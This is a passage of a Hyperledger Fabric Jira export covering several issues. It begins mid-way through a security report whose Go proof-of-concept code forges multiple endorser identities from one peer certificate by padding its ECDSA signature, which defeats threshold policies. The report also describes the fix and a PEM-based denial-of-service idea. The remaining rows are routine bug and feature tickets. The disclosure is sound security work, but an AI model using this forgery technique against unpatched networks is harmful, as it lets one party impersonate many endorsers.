And then I just used a single private key of a peer from Org1 to create *6* fake identities from its single identity, and from having the private key via the following method:

First I define two structs:

One for the real representation of an ECDSA signature which has the r value that hides the random nonce, and one that has the s value that uses the private key:

{code}
type rs struct {
   R, S *big.Int
}
{code}

And another one that has a trailing T (for trash):
{code}
type RST struct {
   R, S, T *big.Int
}
{code}

Next, I take the PEM of the leaf certificate of an endorser and convert its signature to the first correct form:

{code}
var cert certificate
_, err = asn1.Unmarshal(decodedPEM.Bytes, &cert)
if err != nil {
   panic(err)
}

var rs rs
_, err = asn1.Unmarshal(cert.SignatureValue.Bytes, &rs)
if err != nil {
   panic(err)
}

{code}

Afterwards I just override the signature by adding a trailing junk by using the second struct:

{code}
cert.SignatureValue.Bytes, err = asn1.Marshal(RST{
   R: rs.R,
   S: rs.S,
   T: big.NewInt(42 + int64(i)),
})

{code}

Then, I fold back the certificate into the serialized identity and into the endorsement:
{code}
cert.Raw = nil
raw, err := asn1.Marshal(cert)
if err != nil {
   panic(err)
}

clone := proto.Clone(in).(*pb.ProposalResponse)
clone.Endorsement.Endorser = protoutil.MarshalOrPanic(&msp.SerializedIdentity{
   Mspid:   sID.Mspid,
   IdBytes: pem.EncodeToMemory(&pem.Block{Type: decodedPEM.Type, Bytes: raw}),
})
clone.Endorsement.Signature = reSign(clone.Endorsement.Endorser)
{code}

The policy gets evaluated successfully and the transaction is deemed valid.

The full POC can be found in the attached git patch.

h2. *The fix:*

To fix this, we need to simply always marshal the ECDSA signature to ASN1 regardless of if it's in the low *S* or the high *S*

{code}
func SignatureToLowS(k *ecdsa.PublicKey, signature []byte) ([]byte, error) {
   r, s, err := UnmarshalECDSASignature(signature)
   if err != nil {
      return nil, err
   }

   s, _, err = ToLowS(k, s)
   if err != nil {
      return nil, err
   }

   return MarshalECDSASignature(r, s)
}
{code}

Then when I re-run the integration test, I get these lovely warnings in the peers across both orgs:

{code}
[e][Org2.peer0] 2020-04-21 16:47:47.170 IDT [policies] SignatureSetToValidIdentities -> WARN 091 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 1 in signature set
 [e][Org1.peer0] 2020-04-21 16:47:47.170 IDT [policies] SignatureSetToValidIdentities -> WARN 24d De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 1 in signature set
 [e][Org2.peer0] 2020-04-21 16:47:47.170 IDT [policies] SignatureSetToValidIdentities -> WARN 092 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 2 in signature set
 [e][Org1.peer0] 2020-04-21 16:47:47.170 IDT [policies] SignatureSetToValidIdentities -> WARN 24e De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 2 in signature set
 [e][Org2.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 093 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 3 in signature set
 [e][Org1.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 24f De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 3 in signature set
 [e][Org2.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 094 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 4 in signature set
 [e][Org1.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 250 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 4 in signature set
 [e][Org2.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 095 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 5 in signature set
 [e][Org1.peer0] 2020-04-21 16:47:47.171 IDT [policies] SignatureSetToValidIdentities -> WARN 251 De-duplicating identity [Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595] at index 5 in signature set
{code}

and finally:
{code}
 [e][Org1.peer0] 2020-04-21 16:47:47.171 IDT [vscc] Validate -> ERRO 253 VSCC error: stateBasedValidator.Validate failed, err validation of endorsement policy for chaincode mycc in tx 5:0 failed: signature set did not satisfy policy
{code}

A related (much less important issue) is that we should probably also add checks to the [IsWellFormed|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/msp/mspimpl.go#L827]  method, and also check that there are no more bytes after the first PEM block, otherwise a peer can overload the memory of other peers with lots of certificates of the same peer. 
 However this is merely a denial of service attack, and will cause all peers in the network to crash, and there is little to gain in doing this because you'll get caught pretty fast if logs are at debug level (the PEM are printed).",,ales,angelo.decaro,C0rWin,denyeart,elli-androulaki,jyellick,knagware9,mastersingh24,sykesm,yacovm,,,,,,,,,,,Security issue,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17811,,,,,,,,,"22/Apr/20 5:22 AM;yacovm;RST-patch;https://jira.hyperledger.org/secure/attachment/18225/RST-patch",,,,,,,,,,,,,knagware9,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b7f:","Prior to this release, threshold policies of principals from the same organization were completely insecure. ",Yes,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ales,angelo.decaro,C0rWin,denyeart,elli-androulaki,jyellick,knagware9,mastersingh24,sykesm,yacovm,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.1,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Perform Chaos Testing of the Fabric Components,FAB-17779,44905,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,btl5037,btl5037,23/Apr/20 2:10 AM,08/May/20 1:52 PM,28/Oct/23 3:10 AM,08/May/20 1:52 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Hyperledger Fabric is a crash-tolerant peer-to-peer network. As System Test, it is our responsibility to very the resiliency of the components in scenarios where they crash. In that vein, there are several component we need to test:
 * Orderer
 * Peer
 * CouchDB",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement InterOp Lite Test Scenario,FAB-17780,44906,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,23/Apr/20 2:12 AM,10/Jun/20 11:11 PM,28/Oct/23 3:10 AM,10/Jun/20 11:11 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwbi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jun/20 11:11 PM;btl5037;https://github.com/hyperledger/fabric-test/pull/181;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stand Up Kubernetes Cluster,FAB-17781,44907,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,23/Apr/20 2:20 AM,19/May/20 11:28 PM,28/Oct/23 3:10 AM,19/May/20 11:28 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We don't destroy existing networks, so for this work we will run in a totally separate cluster. There is no need for a large cluster, as well will be testing small deployments at first. We should have enough space on the cluster for:
 * 2 orgs
 ** 2 Peer's per org
 *** 1 CA per org
 *** Use CouchDB
 ** 5 Raft Orderers in the same orgs as the peers",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b8j:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deploy Network,FAB-17782,44908,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,23/Apr/20 2:20 AM,11/Jan/21 1:36 AM,28/Oct/23 3:10 AM,11/Jan/21 1:36 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Deploy a network using a pipeline with the following topology on the network, we will reset this network weekly:
 * 2 orgs
 ** 2 Peer's per org
 *** 1 CA per org
 *** Use CouchDB
 ** 5 Raft Orderers

We should install and instantiate a simple Go chaincode on the Chaos network such as samplecc. This chaincode will serve no purpose other than to drive traffic, so it need not be anything fancy.

This network will be redeployed weekly so it needs to be a pipeline and the artifacts need to be saved as a common name in Artifactory we can reference in the pipeline that will drive traffic.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b8r:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Write Pipeline to Drive Traffic,FAB-17783,44909,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,23/Apr/20 2:34 AM,27/Jun/20 12:17 AM,28/Oct/23 3:10 AM,27/Jun/20 12:13 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Our tests will run for a week at a time. Create a pipeline to drive traffic for 4 hours at a time and is on a cronjob to run every 12 hours. Once we have new build agents, we will be able to drive this traffic for 24 hours.

We can do simple invokes and queries in parallel using multiple stages. We just want traffic going through the network.",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b8z:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/20 12:17 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/193;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Legacy chaincode partially installs upon build failure,FAB-17784,44911,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,denyeart,denyeart,23/Apr/20 7:06 AM,17/May/20 5:21 PM,28/Oct/23 3:10 AM,17/May/20 5:21 PM,v2.0.0,v2.1.0,,,,,,,,v2.1.1,v2.2.0,,,fabric-peer,,,,,,,,,0,ipm,operator,,,,"*1st issue*

When using legacy chaincode to install a chaincode, if the chaincode build on the peer fails, you'll get an error that says the install failed.

However, the chaincode package actually gets installed in the peer's legacy /chaincode directory.  This is both confusing, and makes it difficult to re-attempt the build once the underlying build issue is resolved.

I emulated this problem by configuring my peer to use ccenv:latest2 to build the chaincode, which does not exist.
{code:java}
$ peer chaincode install -n marbles2 -p github.com/hyperledger/fabric-samples/chaincode/marbles02/go/ -v 1

Error: install failed with status: 500 - could not build chaincode: docker build failed: docker image build failed: docker build failed: Failed to pull hyperledger/fabric-ccenv:latest2: API error (404): manifest for hyperledger/fabric-ccenv:latest2 not found: manifest unknown: manifest unknown

$ peer chaincode list --installed
Get installed chaincodes on peer:

Name: marbles2, Version: 1, Path: github.com/hyperledger/fabric-samples/chaincode/marbles02/go/, Id: 1b9ca3ca452c095825fae828bcb1380edca18ced28c4025433c6a349aa2adad4
{code}
 The same trial with new lifecycle gives the expected results. The installation fails with a similar error and the chaincode does NOT get installed at all (not in the new /lifecycle/chaincodes directory).

 

*2nd issue*

However, there is a second issue with new lifecycle. Even when the build issue is resolved (in my case I kept the peer up, tagged ccenv:latest to ccenv:latest2, did not change core.yaml settings), the next installation attempt still fails with the same error message, even though ccenv:latest2 now exists on the peer machine:
{code:java}
 $ peer lifecycle chaincode install marbles.tar.gz

Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: docker build failed: Failed to pull hyperledger/fabric-ccenv:latest2: API error (404): manifest for hyperledger/fabric-ccenv:latest2 not found: manifest unknown: manifest unknown
{code}
 When I restart peer and attempt the install yet again, it succeeds.  So it seems the peer caches the fact that the builder image cannot be found, and restarting the peer is required in order for peer to find the newly tagged ccenv:latest2 builder image.",,denyeart,jyellick,sykesm,varadatibm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17907,,,,FABCN-396,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzw",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jyellick,sykesm,varadatibm,wlahti,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Apr/20 1:52 PM;denyeart;Looks like this legacy chaincode lifecycle was intentional, see comment in:

https://jira.hyperledger.org/browse/FAB-16866?focusedCommentId=65988&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-65988

In my opinion, the behavior with legacy chaincode that allows a 'partial' install (chaincode actually installed but error returned and chaincode image not built) is wrong. I realize now that it was done to have some consistency with v1.x, but I would have preferred to completely fail the install to be consistent with new lifecycle and release note the behavior change, rather than leave the chaincode in an unexpected state on the peer. Alternatively if the behavior could be documented including remediation steps, that would be acceptable.;;;","12/May/20 7:14 AM;denyeart;The second issue relating to new lifecycle should probably be split into a separate issue. For now I included it with the first to provide the recreation context.;;;","12/May/20 1:33 PM;jyellick;As [~denyeart] mentions in his reply.  The behavior of a 'partial install' for legacy chaincodes is working as designed.  I agree that it's odd, and broken behavior, but behavior that some applications may depend on.  This is not a hypothetical concern, as it is quite common to find users in the field which have retry logic built in around chaincode instantiation to address build timeouts.  Arguably, to be more consistent, we could have returned success on legacy chaincode install, even if the build failed as was the old behavior, but returning failure and leaving the package was judged to be a reasonable balance between sanity and compatibility.

With respect to the second issue, this is also ""working as designed"", though perhaps less obviously so.  The assumption made by the new lifecycle, is that if the package is exactly byte-for-byte the same, and a build has already been attempted, there's no need to try to rebuild, we already have the build result.  This is desirable in the event that a chaincode is on the filesystem, but has no built version available.  If the initial build fails, we remember the build failed, rather than entering an endless resource consuming cycle of build, fail, build, fail, etc.

Build results are cached by package ID, which changes any time the package contents change.  Because the package is identically the same, the peer still expects the same result will occur and returns the cached error.  In this particular case, the chaincode bytes were removed from the filesystem, so there's no risk of the build/fail cycle occurring, so, the behavior isn't advantageous here.

So, to address the second part of this bug we could:

1) Always retry failed builds -- stop caching failed build results.
2) Explicitly remove failed build results from the cache when that failure is a part of install.
3) Accept this odd behavior as a bit of a corner case and document that either the peer must be restarted to clear the cache, or some small package modification must be made (say, changing the label slightly).

My expectation would be that usually, when a user's chaincode does not build, they update the chaincode package to address the build failure, in which case, this is a non-issue.  If the user changes the chaincode environment (specifying a different ccenv tag for instance in core.yaml), this also requires a restart, which makes the point moot.  The only time this is a problem is when we have issue with resources having transient unavailability, like the missing tag specified here.

[~sykesm] probably has an opinion here as well.;;;","12/May/20 10:38 PM;denyeart;For the first issue, early adopters of v2.0 have already complained about the unexpected results, so I do think some action is required. We intentionally did not make v2.0 a LTS release so that we could address early adopter feedback like this, and mention any changes in v2.2 release notes.

For the second issue, I would vote for Jason's option #2.  If we go with option #3, the error message should also be clarified to indicate that the cached error results are being returned, and that a server restart would be required for a fresh build of the chaincode.;;;","12/May/20 10:47 PM;varadatibm;[~jyellick] I don't think we want to drop the non-working cc on the peer... there is no way to know that it is bad until you go to instantiate... 

Also on the timeout scenario, we never had an issue with the install cc before in 1.4.x... obviously with the new format (V2), there is potential timeouts and retries... and also even if they had retries I suspect people would stop after X number of attempts.

I vote that we change the behavior to not install bad cc on the peer.;;;","12/May/20 11:26 PM;sykesm;{quote}Explicitly remove failed build results from the cache when that failure is a part of install.{quote}

I think this is probably the correct move - with a minor qualification. If someone installs chaincode that doesn't build, there's no reason to believe that problem isn't permanent so I believe caching the failed result is appropriate.

That said, if someone pokes the peer and says ""install this package"" and the registry indicates the package build has failed, we should remove the failure and re-run the build process assuming some external issue was resolved.

Basically, in the normal case, there's no need to beat our head against wall trying to build the same package over and over and over again but we should assume that someone explicitly doing an install probably knows something we don't.

{quote}My expectation would be that usually, when a user's chaincode does not build, they update the chaincode package to address the build failure, in which case, this is a non-issue.{quote}

Yes, this is the reason why we don't keep retrying a failed build.;;;","13/May/20 5:44 AM;jyellick;So, it seems like we agree on (2) at least.  We should add special handling that, in the new lifecycle in event of install, if the build has already failed, we should explicitly remove the cached failure and try again.

With respect to (1), I'm not sure we have a solution?  To Varad's point, in v1.x, we did not have timeout issues on install, we had them on instantiate.  v2.0 moves the location of those timeouts.  The current behavior is that, like in v1.x, a failed build has no impact on whether the chaincode installs.  (Note, in order to support the external builders in v2.0, we had to push the build process to install, so as to make the chaincode indices work properly.).  We can either a) ignore a failed build, like in v1.4.x, b) emulate the new lifecycle and attempt to remove the chaincode package from the filesystem (though I think this is dangerous and racy because of the way legacy chaincode works), or c) leave things the way they are.  Thoughts?;;;","16/May/20 4:11 AM;wlahti;Given the convoluted and far-reaching footprint of the legacy lifecycle code, the current agreement that came from a conversation between [~jyellick], [~denyeart], [~varadatibm], and myself is that the only safe thing we can do in terms of this issue is update the error message (only for legacy lifecycle-installed chaincodes) to (new portion of message in red):

Error: install failed with status: 500 - {color:#FF0000}chaincode installed to peer but {color}could not build chaincode: docker build failed: docker image build failed: docker build failed: Failed to pull hyperledger/fabric-ccenv:latest2: API error (404): manifest for hyperledger/fabric-ccenv:latest2 not found: manifest unknown: manifest unknown;;;","16/May/20 4:13 AM;wlahti;I will split the new lifecycle change to ignore cached failed builds when a user retries a failed install, assuming they must know something about why the build might succeed on retry. ;;;","16/May/20 5:18 AM;wlahti;For the legacy lifecycle (LSCC) error message: 

master: [https://github.com/hyperledger/fabric/pull/1276]

release-2.1: [https://github.com/hyperledger/fabric/pull/1281];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Demo CLI for configtx package,FAB-17785,44912,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,23/Apr/20 7:21 AM,13/May/20 10:56 PM,28/Oct/23 3:10 AM,13/May/20 10:56 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a member of the hyperledger community, I would like to see a demo/sample configtx CLI that utilizes the configtx package so that I have a better idea of how to consume the library. This CLI may end up being a community tool as well that replaces configtxgen for general config transaction generation.

 

*Acceptance*

**A simple CLI exists for the configtx library that has commands and flags for generating system channel genesis blocks, application create channel transactions, and config updates supporting all updatable config properties via flags or subcommands.

Example:
{code:java}
configtx update addAnchorPeer --config ./current_config.pb --org Org1 --anchorPeer newhost:123 --output ./config_update.pb{code}
The above command (or something similar to it) should produce a config update transaction adding anchor peer newhost:123 to Org1.

The CLI should be well documented for use cases in the help/manual.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzk",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/May/20 10:53 PM;tsharris;[https://github.com/stephyee/fabric/tree/fab-17785-demo-cli];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As an administrator, I want the peer upgrade-dbs command to automatically drop and rebuild state couchdbs during 1.x to 2.x upgrade",FAB-17786,44914,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,23/Apr/20 11:19 AM,14/May/20 12:18 AM,28/Oct/23 3:10 AM,14/May/20 12:02 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,operator,,,,,"Background:
 * When upgrading from 1.x to 2.0/2.1(running ""peer node upgrade-dbs"" command), it automatically drops state leveldbs, but not couchdbs. Therefore, administrators have to drop state couchdbs separately. This may complicate the upgrade process.

Acceptance criteria:
 * During 1.x to 2.x upgrade (running ""peer node upgrade-dbs"" command), automatically drop couch dbs.
 * The dropped state couchdbs are rebuilt successfully upon peer restart.",,robmurgai,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17865,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idi",,,,No,Unset,v2.x,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),robmurgai,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Apr/20 11:21 PM;wenjian;CR: [https://github.com/hyperledger/fabric/pull/1187];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance ledger to support per-channel based data deletion,FAB-17787,44915,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,23/Apr/20 11:59 AM,17/Jun/21 9:28 PM,28/Oct/23 3:10 AM,05/Oct/20 11:44 PM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,ledger,Ledger,,,,"We need to clean up ledger data in multiple scenarios, such as peer bootstrap crash and reset/rollback. In the past, because cross-channel data are stored in the same level db, we have chosen to drop the entire databases for simplicity. With the checkpointing support, we cannot drop the entire databases any more because the bootstrapping snapshot may not be available to rebuild the channel data. This story adds the support to delete per-channel data from the ledger instead of dropping the entire databases.

 

State CouchDB has its own challenge. Individual couch databases are created to store state data at a per-chaincode/collection basis. Because CouchDB has length limitation for db names, channel name may be truncated if the combined length of channel+namespace+collection is over the limit (see [https://github.com/hyperledger/fabric/blob/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdbutil.go#L204]). As a result, we cannot deterministically calculate the channel name if the channel name has been truncated in a couch database name. To know what couchdbs belong to a channel, we have to query the statedb to find out the deployed chaincodes and collections so that we can reconstruct the couch database names. However, if something goes wrong during channel bootstrapping, we may have partially loaded lscc, _lifecycle, and state tables and cannot query statedb to get the chaincode info. Therefore, we will add a mapping of channel names to known couchdb names for the channel, so that we know what databases to delete after crash.

 

In summary, this story enhances the ledger component to allow per-channel based data deletion. This enhancement will be leveraged by bootstrap failure recovery, peer restart flow, reset/rollback, and channel unjoining.",,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17801,FAB-17803,,,,,,,,,,,,,,,FAB-11334,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0iid",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric orderer and peers not sending operational metrics (statsd),FAB-17788,44916,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,SharedMocha,SharedMocha,23/Apr/20 12:03 PM,24/Apr/20 1:33 AM,28/Oct/23 3:10 AM,24/Apr/20 1:33 AM,v1.4.6,,,,,,,,,,,,,,,,,,,,,,0,Stasd,,,,,"According to the documentation below metrics should be sent to statsD.

[https://hyperledger-fabric.readthedocs.io/en/release-2.0/metrics_reference.html]

After setting statsd and graphite I don't see all metrics appearing. Below is a  working link from graphite showing metrics from  3 orderers and 2 nodes with missing metrics as below

[http://54.177.89.130:81/login]

 

+Below key metrics are missing in graphite which is connected to statsd-+

*Orderer* (Kafka) - 
blockcutter
broadcast.
cluster
consensus
deliver
fabric_version
ledger

*Peer* -
chaincode
deliver
dockercontroller
endorser
fabric_version (Not shown for all the peers)
ledger
logging (Counters not being shown)

 ",,denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ba3:",,,,Unset,Unset,,"1.) Setup a cluster with one kafka orderer,  2 orgs with one peer each
2.) Provide below environment variables in  docker-compose of the orderer and peer to send logs to statsd -
            - ORDERER_METRICS_PROVIDER=statsd
            - ORDERER_METRICS_STATSD_NETWORK=udp
            - ORDERER_METRICS_STATSD_ADDRESS=54.215.28.86:8125
            
            - CORE_METRICS_PROVIDER=statsd
            - CORE_METRICS_STATSD_NETWORK=udp
            - CORE_METRICS_STATSD_ADDRESS=54.215.28.86:8125
            - CORE_METRICS_STATSD_PREFIX=peer0.org1.example.com
3.) Have a statsd and graphite server or docker container running (here is a docker image I used - https://hub.docker.com/r/hopsoft/graphite-statsd)
4.) Bring orderer,peers, and statsd/graphite up (** Ensure statsd/graphite is part of the same network if using docker or else the peers and orders will fail to startup)
5.) Goto graphite UI and check to see if the below metrics area available/missing. You can notice that counter metrics are all missing along with below few

Orderer (Kafka) - 
blockcutter
broadcast.
cluster
consensus
deliver
fabric_version
ledger

Peer -
chaincode
deliver
dockercontroller
endorser
fabric_version (Not shown for all the peers)
ledger
logging (Counters not being shown)",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Apr/20 1:33 AM;denyeart;I looked at your Graphite dashboard, I see all the metrics in the 'stats' section now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
